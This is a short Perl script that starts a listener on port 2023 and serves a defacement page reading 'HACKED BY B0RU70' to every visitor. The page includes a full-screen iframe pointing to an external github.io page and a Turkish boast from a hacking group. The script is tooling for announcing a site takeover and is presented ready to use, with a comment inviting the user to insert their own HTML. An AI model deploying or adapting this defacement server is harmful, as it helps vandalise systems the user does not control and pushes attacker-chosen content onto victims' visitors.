#!/usr/bin/perl -w
use strict;
use IO::Socket;

sub Wait {
	wait; # wait needed to keep <defunct> pids from building up
}

$SIG{CHLD} = \&Wait;

my $server = IO::Socket::INET->new(
	LocalPort 	=> 2023,
	Type 		=> SOCK_STREAM,
	Reuse 		=> 1,
	Listen 		=> 10) or die "$@\n";
my $client ;

while($client = $server->accept()) {
	select $client;
	print $client "HTTP/1.0 200 OK\r\n";
	print $client "Content-type: text/html\r\n\r\n";
	print $client '<title>HACKED BY B0RU70</title><center><h1>HACKED BY B0RU70</h1></center><iframe src="https://b0ru70.github.io/b0ru70.html" style="position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"> </iframe> 
	KaRaNLiK oRDu  GuRuRLa SunaR..!! 
'; # set your html contents
}
continue {
	close($client); #kills hangs
	kill CHLD => -$$;
}